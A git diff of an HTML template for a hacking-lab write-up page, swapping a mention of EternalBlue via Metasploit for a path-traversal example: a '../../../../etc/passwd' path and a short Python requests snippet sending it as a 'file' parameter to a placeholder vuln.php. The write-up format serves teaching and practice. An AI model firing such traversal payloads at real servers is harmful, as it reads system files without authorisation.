@@ -7,22 +7,21 @@
     <link rel="stylesheet" href="../assets/css/writeup.css">
     <link rel="stylesheet" href="../assets/css/global.css">
     <link rel="stylesheet" href="../assets/css/index.css">
+    <link rel="stylesheet" href="../assets/css/code.css">
 
-    <script src="../assets/js/terminal.js" defer></script>
     <script src="../assets/js/footer.js" defer></script>
     <script src="../assets/js/zoomer.js" defer></script>
 </head>
 <body>
-    <!--This file is a template file and should therefor not be taken seriously-->
     <nav>
         <div class="terminal">
             <span class="prompt">londra@kali $> </span>
             <span class="typed"></span><span class="cursor">_</span>
         </div>
         <div>
-            <a href="">Home</a>
-            <a href="">Writeups</a>
-            <a href="">Contact</a>
+            <a href="../../../index.html">Home</a>
+            <a href="../../../writeuplist.html">Writeups</a>
+            <a href="../../../contact.html">Contact</a>
         </div>
     </nav>
 
@@ -55,20 +54,26 @@
                 Initial scanning was performed using Nmap to identify open ports
                 and services running on the target system.
                 </p>
-
             </section>
 
             <section class="writeup-section">
 
                 <h2 class="section-title">Exploitation</h2>
 
-                <img src="ss.png" class="lab-image zoomable">
+                <span class="path">../../../../etc/passwd</span> <p>That is a path. Just to remember the structure</p>
 
-                <p>
-                The SMB service was vulnerable to EternalBlue which allowed
-                remote code execution through the Metasploit module.
-                </p>
 
+                <details class="code-block">
+                    <summary>Sample code</summary>
+<pre><code>import requests
+
+url = "http://target.com/vuln.php"
+payload = "../../../../etc/passwd"
+
+r = requests.get(url, params={"file": payload})
+print(r.text)
+</code></pre>
+                </details>
             </section>
         </article>
     </main>
